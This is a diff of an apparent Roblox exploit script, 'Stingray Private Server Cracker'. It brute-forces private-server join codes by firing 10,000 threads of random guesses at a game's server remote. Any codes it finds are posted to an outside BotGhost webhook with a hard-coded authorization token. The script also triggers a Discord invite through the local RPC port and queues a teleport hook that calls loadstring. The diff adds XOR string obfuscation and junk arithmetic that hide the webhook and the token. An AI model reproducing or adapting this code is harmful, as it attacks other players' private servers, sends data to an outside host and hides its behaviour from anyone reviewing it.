@@ -1,113 +1,192 @@
-repeat task.wait() until game:IsLoaded()
+
+local obf_stringchar = string.char;
+local obf_stringbyte = string.byte;
+local obf_stringsub = string.sub;
+local obf_bitlib = bit32 or bit;
+local obf_XOR = obf_bitlib.bxor;
+local obf_tableconcat = table.concat;
+local obf_tableinsert = table.insert;
+local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
+	local result = {};
+	for i = 2 - 1, #LUAOBFUSACTOR_STR do
+		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, (2 - 1) + (i % #LUAOBFUSACTOR_KEY), (1 - 0) + (i % #LUAOBFUSACTOR_KEY) + 1))) % (659 - 403)));
+	end
+	return obf_tableconcat(result);
+end
+bit32 = {};
+local N = 651 - (555 + 64);
+local P = (933 - (857 + 74)) ^ N;
+bit32.bnot = function(x)
+	x = x % P;
+	return (P - (569 - (367 + 201))) - x;
+end;
+bit32.band = function(x, y)
+	if ((y == (1182 - (214 + 713))) or (4593 <= 2672)) then
+		return x % (65 + 191);
+	end
+	if ((y == (10307 + 55228)) or (1168 > 3156)) then
+		return x % 65536;
+	end
+	if (y == (4294968172 - (282 + 595))) then
+		return x % (4294968933 - (1523 + 114));
+	end
+	x, y = x % P, y % P;
+	local r = 0 + 0;
+	local p = 1;
+	for i = 1 - 0, N do
+		local a, b = x % (1067 - (68 + 997)), y % 2;
+		x, y = math.floor(x / (1272 - (226 + 1044))), math.floor(y / 2);
+		if ((a + b) == 2) then
+			r = r + p;
+		end
+		p = (8 - 6) * p;
+	end
+	return r;
+end;
+bit32.bor = function(x, y)
+	if ((y == (372 - (32 + 85))) or (572 > 4486)) then
+		return (x - (x % (251 + 5))) + 255;
+	end
+	if ((1404 == 1404) and (y == (14533 + 51002))) then
+		return (x - (x % 65536)) + 65535;
+	end
+	if (y == (4294968252 - (892 + 65))) then
+		return 4294967295;
+	end
+	x, y = x % P, y % P;
+	local r = 0 - 0;
+	local p = 1;
+	for i = 1 - 0, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / (3 - 1));
+		if (((a + b) >= (351 - (87 + 263))) or (3748 < 2212)) then
+			r = r + p;
+		end
+		p = 2 * p;
+	end
+	return r;
+end;
+bit32.bxor = function(x, y)
+	x, y = x % P, y % P;
+	local r = 180 - (67 + 113);
+	local p = 1;
+	for i = 1 + 0, N do
+		local a, b = x % 2, y % (4 - 2);
+		x, y = math.floor(x / (2 + 0)), math.floor(y / 2);
+		if (((a + b) == (3 - 2)) or (1180 == 2180)) then
+			r = r + p;
+		end
+		p = (954 - (802 + 150)) * p;
+	end
+	return r;
+end;
+bit32.lshift = function(x, s_amount)
+	if ((4090 < 4653) and (math.abs(s_amount) >= N)) then
+		return 0;
+	end
+	x = x % P;
+	if ((s_amount < (0 - 0)) or (2652 < 196)) then
+		return math.floor(x * (2 ^ s_amount));
+	else
+		return (x * (2 ^ s_amount)) % P;
+	end
+end;
+bit32.rshift = function(x, s_amount)
+	if ((4135 < 4817) and (math.abs(s_amount) >= N)) then
+		return 0;
+	end
+	x = x % P;
+	if ((272 == 272) and (s_amount > (0 - 0))) then
+		return math.floor(x * ((2 + 0) ^ -s_amount));
+	else
+		return (x * (2 ^ -s_amount)) % P;
+	end
+end;
+bit32.arshift = function(x, s_amount)
+	if ((100 <= 3123) and (math.abs(s_amount) >= N)) then
+		return 997 - (915 + 82);
+	end
+	x = x % P;
+	if (s_amount > 0) then
+		local add = 0;
+		if ((x >= (P / (5 - 3))) or (1369 > 4987)) then
+			add = P - ((2 + 0) ^ (N - s_amount));
+		end
+		return math.floor(x * ((2 - 0) ^ -s_amount)) + add;
+	else
+		return (x * ((1189 - (1069 + 118)) ^ -s_amount)) % P;
+	end
+end;
+repeat
+	task.wait();
+until game:IsLoaded() 
 local function SecureHook(Message)
-    local Result = ""
-    local C = "abcdefghijklmnopqrstuvwxyz"
-    for i = 1, 64 do
-        local Rand = math.random(1, #C)
-        Result = Result .. C:sub(Rand, Rand)
-    end
-    local data = {
-        variables = {{
-            name = "message",
-            variable = "{event_message}",
-            value = Message
-        }, {
-            name = "title",
-            variable = "{event_title}",
-            value = Result
-        }}
-    }
-    local s, e = pcall(function()
-        local a = request({
-            Url = "https://api.botghost.com/webhook/1107891166940246016/8mu0qk8cgtr07kqw5o0irbw",
-            Headers = {
-                ['Content-Type'] = 'application/json',
-                ['Authorization'] = '976fd7a098cc7f3b0ee971bb9befa6a7a549025a6a45db379d6e53a6c4684da3'
-            },
-            Body = game:GetService("HttpService"):JSONEncode(data),
-            Method = "POST"
-        })
-    end)
+	local Result = "";
+	local C = LUAOBFUSACTOR_DECRYPT_STR_0("\208\193\216\33\227\189\192\22\216\201\208\41\235\181\200\14\192\209\200\49\243\173\208\6\200\217", "\126\177\163\187\69\134\219\167");
+	for i = 2 - 1, 64 do
+		local Rand = math.random(1, #C);
+		Result = Result .. C:sub(Rand, Rand);
+	end
+	local data = {[LUAOBFUSACTOR_DECRYPT_STR_0("\53\204\56\204\253\33\193\47\214", "\156\67\173\74\165")]={{[LUAOBFUSACTOR_DECRYPT_STR_0("\58\182\68\19", "\38\84\215\41\118\220\70")]=LUAOBFUSACTOR_DECRYPT_STR_0("\93\19\49\1\255\87\19", "\158\48\118\66\114"),[LUAOBFUSACTOR_DECRYPT_STR_0("\189\37\2\63\114\167\247\174", "\155\203\68\112\86\19\197")]=LUAOBFUSACTOR_DECRYPT_STR_0("\93\216\32\249\78\108\218\245\67\206\37\253\71\125\248", "\152\38\189\86\156\32\24\133"),[LUAOBFUSACTOR_DECRYPT_STR_0("\234\86\171\83\249", "\38\156\55\199")]=Message},{[LUAOBFUSACTOR_DECRYPT_STR_0("\166\124\113\45", "\35\200\29\28\72\115\20\154")]=LUAOBFUSACTOR_DECRYPT_STR_0("\13\182\197\211\136", "\84\121\223\177\191\237\76"),[LUAOBFUSACTOR_DECRYPT_STR_0("\173\87\219\169\59\82\60\196", "\161\219\54\169\192\90\48\80")]=LUAOBFUSACTOR_DECRYPT_STR_0("\82\71\22\32\71\86\63\49\64\86\12\32\84", "\69\41\34\96"),[LUAOBFUSACTOR_DECRYPT_STR_0("\170\194\219\31\7", "\75\220\163\183\106\98")]=Result}}};
+	local s, e = pcall(function()
+		local a = request({[LUAOBFUSACTOR_DECRYPT_STR_0("\55\168\135", "\185\98\218\235\87")]=LUAOBFUSACTOR_DECRYPT_STR_0("\195\40\51\246\205\240\132\115\38\246\215\228\201\51\51\225\214\165\216\40\105\229\209\167\132\43\34\228\214\165\196\55\104\183\143\250\156\100\126\183\143\252\157\101\115\182\140\254\157\108\118\176\145\242\198\41\119\247\213\242\200\59\51\244\142\253\192\45\48\179\209\250\194\46\37\241", "\202\171\92\71\134\190"),[LUAOBFUSACTOR_DECRYPT_STR_0("\1\196\45\140\44\211\63", "\232\73\161\76")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\152\214\76\73\27\181\205\15\105\7\171\220", "\126\219\185\34\61")]=LUAOBFUSACTOR_DECRYPT_STR_0("\13\222\78\126\119\116\242\243\5\193\80\61\116\100\252\233", "\135\108\174\62\18\30\23\147"),[LUAOBFUSACTOR_DECRYPT_STR_0("\151\252\62\195\23\188\58\221\183\253\35\196\22", "\167\214\137\74\171\120\206\83")]=LUAOBFUSACTOR_DECRYPT_STR_0("\210\167\100\91\252\240\138\160\107\5\251\164\220\246\97\95\168\162\142\169\101\12\250\165\210\242\55\91\249\241\138\167\51\8\172\254\219\162\103\92\174\166\223\165\54\95\171\240\210\244\100\88\173\244\138\166\49\9\174\255\223\244\51\14", "\199\235\144\82\61\152")},[LUAOBFUSACTOR_DECRYPT_STR_0("\37\25\189\50", "\75\103\118\217")]=game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\239\64\100\4\138\27\213\66\121\23\188", "\126\167\52\16\116\217")):JSONEncode(data),[LUAOBFUSACTOR_DECRYPT_STR_0("\229\43\52\136\187\29", "\156\168\78\64\224\212\121")]=LUAOBFUSACTOR_DECRYPT_STR_0("\55\193\150\250", "\174\103\142\197")});
+	end);
 end
-
 local function Display()
-    local CG = game:GetService("CoreGui")
-	local M = Instance.new("Message")
-	M.Parent = CG
-	M.Text = 'Stingray Private Server Cracker\n[PLEASE WAIT - CRACKING IN PROGRESS...]'
+	local CG = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\117\39\77\61\2\75\241", "\152\54\72\63\88\69\62"));
+	local M = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\249\193\253\79\213\195\235", "\60\180\164\142"));
+	M.Parent = CG;
+	M.Text = "Stingray Private Server Cracker\n[PLEASE WAIT - CRACKING IN PROGRESS...]";
 end
-
 local function Gen()
-    local Result = ""
-    local C = "abcdefghijklmnopqrstuvwxyz"
-    for i = 1, 5 do
-        local Rand = math.random(1, #C)
-        Result = Result .. C:sub(Rand, Rand)
-    end
-    return Result
+	local Result = "";
+	local C = LUAOBFUSACTOR_DECRYPT_STR_0("\89\92\6\45\34\235\21\80\87\15\34\43\224\28\87\78\20\59\52\249\7\78\73\29\48\61", "\114\56\62\101\73\71\141");
+	for i = 1, 5 do
+		local Rand = math.random(1 + 0, #C);
+		Result = Result .. C:sub(Rand, Rand);
+	end
+	return Result;
 end
-
-local ID = math.random(10, 99)
-local Iterate = 10000
-print("\n")
-print("PS Cracking Starting | ID-" .. tostring(ID))
-local Remote = game:GetService("ReplicatedStorage"):WaitForChild("ReplicatedModules"):WaitForChild("KnitPackage")
-    :WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("PrivateCodeService"):WaitForChild("RF"):WaitForChild(
-        "Invoke")
-for i = 1, Iterate do
-    task.spawn(function()
-        local StartTime = tick()
-        local Code = Gen()
-        local args = {
-            [1] = "JoinCode",
-            [2] = {
-                ["Code"] = Code
-            }
-        }
-        local Status
-        local s, e = pcall(function()
-            Status = Remote:InvokeServer(unpack(args))
-        end)
-        if not s then
-            print("Internal Error On Thread ID", i)
-        end
-        if tostring(Status) ~= "CodeNil" then
-            local C = "AUT Private Server Found: " .. string.upper(Code).." | Manta-Testing"
-            SecureHook(C)
-            print("Thread ID", i, "detached | Time Taken:", math.floor(tick() - StartTime), "| Code Success: ", Code)
-        end
-        if i == Iterate then
-            print("All threads successfully detached | ID-" .. tostring(ID))
-        end
-    end)
-    if i % 100 == 0 then
-        task.wait()
-    end
+local ID = math.random(10, 175 - 76);
+local Iterate = 10000;
+print("\n");
+print(LUAOBFUSACTOR_DECRYPT_STR_0("\136\218\155\231\170\232\216\207\177\231\220\132\139\253\218\214\172\224\213\195\248\245\155\237\156\164", "\164\216\137\187") .. tostring(ID));
+local Remote = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\224\227\33\190\175\253\10\198\227\53\129\178\241\25\211\225\52", "\107\178\134\81\210\198\158")):WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\10\11\146\202\163\59\15\150\195\174\21\1\134\211\166\61\29", "\202\88\110\226\166")):WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\232\1\139\227\250\194\12\137\246\205\198", "\170\163\111\226\151")):WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\58\62\187\44", "\73\113\80\210\88\46\87")):WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\178\41\223\4\238\130\41\222", "\135\225\76\173\114")):WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\42\255\177\166\173\169\162\57\226\188\181\159\184\181\12\228\187\181", "\199\122\141\216\208\204\221")):WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\159\251", "\150\205\189\112\144\24")):WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\12\138\169\67\15\141", "\112\69\228\223\44\100\232\113"));
+for i = 1 + 0, Iterate do
+	task.spawn(function()
+		local StartTime = tick();
+		local Code = Gen();
+		local args = {[792 - (368 + 423)]=LUAOBFUSACTOR_DECRYPT_STR_0("\254\16\14\221\149\115\130\209", "\230\180\127\103\179\214\28"),[2]={[LUAOBFUSACTOR_DECRYPT_STR_0("\175\10\91\67", "\128\236\101\63\38\132\33")]=Code}};
+		local Status;
+		local s, e = pcall(function()
+			Status = Remote:InvokeServer(unpack(args));
+		end);
+		if not s then
+			print(LUAOBFUSACTOR_DECRYPT_STR_0("\133\167\5\65\164\229\206\160\233\52\86\164\228\221\236\134\31\4\130\227\221\169\168\21\4\159\207", "\175\204\201\113\36\214\139"), i);
+		end
+		if ((tostring(Status) ~= LUAOBFUSACTOR_DECRYPT_STR_0("\100\195\49\217\42\78\192", "\100\39\172\85\188")) or (863 >= 4584)) then
+			local C = LUAOBFUSACTOR_DECRYPT_STR_0("\150\78\235\189\115\140\77\141\192\3\191\113\175\129\39\168\56\138\133\33\187\125\171\192\21\162\109\183\132\105\237", "\83\205\24\217\224") .. string.upper(Code);
+			SecureHook(C);
+			print(LUAOBFUSACTOR_DECRYPT_STR_0("\210\205\223\56\231\193\141\20\194", "\93\134\165\173"), i, LUAOBFUSACTOR_DECRYPT_STR_0("\186\247\213\195\57\198\183\122\254\238\129\246\51\195\183\62\138\243\202\199\52\148", "\30\222\146\161\162\90\174\210"), math.floor(tick() - StartTime), LUAOBFUSACTOR_DECRYPT_STR_0("\249\14\83\5\225\75\48\57\240\77\115\15\246\93\42\74", "\106\133\46\16"), Code);
+		end
+		if ((i == Iterate) or (724 >= 1668)) then
+			print(LUAOBFUSACTOR_DECRYPT_STR_0("\121\44\127\188\78\72\74\37\114\248\73\0\75\53\112\255\95\83\75\38\102\240\86\89\24\36\118\232\91\67\80\37\119\188\70\0\113\4\62", "\32\56\64\19\156\58") .. tostring(ID));
+		end
+	end);
+	if ((i % 100) == 0) then
+		task.wait();
+	end
 end
-print(Iterate, "Threads Created | ID-" .. tostring(ID))
+print(Iterate, LUAOBFUSACTOR_DECRYPT_STR_0("\110\192\247\83\91\246\147\26\235\247\83\91\230\133\94\136\249\22\115\214\205", "\224\58\168\133\54\58\146") .. tostring(ID));
 pcall(function()
-    request({
-        Url = "http://127.0.0.1:6463/rpc?v=1",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json",
-            ["origin"] = "https://discord.com"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({
-            ["args"] = {
-                ["code"] = "SzdQMf9XBB"
-            },
-            ["cmd"] = "INVITE_BROWSER",
-            ["nonce"] = "."
-        })
-    })
-end)
-Display()
-if type(queue_on_teleport) == "function" then
-    queue_on_teleport([[
+	request({[LUAOBFUSACTOR_DECRYPT_STR_0("\108\68\71", "\107\57\54\43\157\21\230\231")]=LUAOBFUSACTOR_DECRYPT_STR_0("\211\159\5\229\227\147\128\138\217\70\187\233\146\159\149\218\75\163\237\138\156\148\153\1\246\230\202\146\138", "\175\187\235\113\149\217\188"),[LUAOBFUSACTOR_DECRYPT_STR_0("\17\170\149\68\236\125", "\24\92\207\225\44\131\25")]=LUAOBFUSACTOR_DECRYPT_STR_0("\123\252\139\120", "\29\43\179\216\44\123"),[LUAOBFUSACTOR_DECRYPT_STR_0("\149\220\33\72\184\203\51", "\44\221\185\64")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\34\232\70\75\118\15\243\5\107\106\17\226", "\19\97\135\40\63")]=LUAOBFUSACTOR_DECRYPT_STR_0("\175\76\35\55\38\50\175\72\58\52\33\126\164\79\60\53", "\81\206\60\83\91\79"),[LUAOBFUSACTOR_DECRYPT_STR_0("\65\185\217\117\38\205", "\196\46\203\176\18\79\163\45")]=LUAOBFUSACTOR_DECRYPT_STR_0("\176\54\106\14\55\161\160\247\38\119\13\39\244\253\188\108\125\17\41", "\143\216\66\30\126\68\155")},[LUAOBFUSACTOR_DECRYPT_STR_0("\136\199\9\210", "\129\202\168\109\171\165\195\183")]=game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\10\76\35\200\237\17\244\52\81\52\221", "\134\66\56\87\184\190\116")):JSONEncode({[LUAOBFUSACTOR_DECRYPT_STR_0("\61\35\14\168", "\85\92\81\105\219\121\139\65")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\254\188\84\64", "\191\157\211\48\37\28")]=LUAOBFUSACTOR_DECRYPT_STR_0("\236\5\240\45\23\217\70\204\62\24", "\90\191\127\148\124")},[LUAOBFUSACTOR_DECRYPT_STR_0("\123\138\42", "\119\24\231\78")]=LUAOBFUSACTOR_DECRYPT_STR_0("\171\3\147\99\232\101\46\160\31\138\125\239\101\35", "\113\226\77\197\42\188\32"),[LUAOBFUSACTOR_DECRYPT_STR_0("\52\25\250\182\63", "\213\90\118\148")]="."})});
+end);
+Display();
+if (type(queue_on_teleport) == LUAOBFUSACTOR_DECRYPT_STR_0("\93\59\186\85\89\82\33\186", "\45\59\78\212\54")) then
+	queue_on_teleport([[
         repeat task.wait() until game:IsLoaded()
         if #game:GetService("Players"):GetPlayers()>=2 then
             loadstring()
         end
-    ]])
+    ]]);
 end
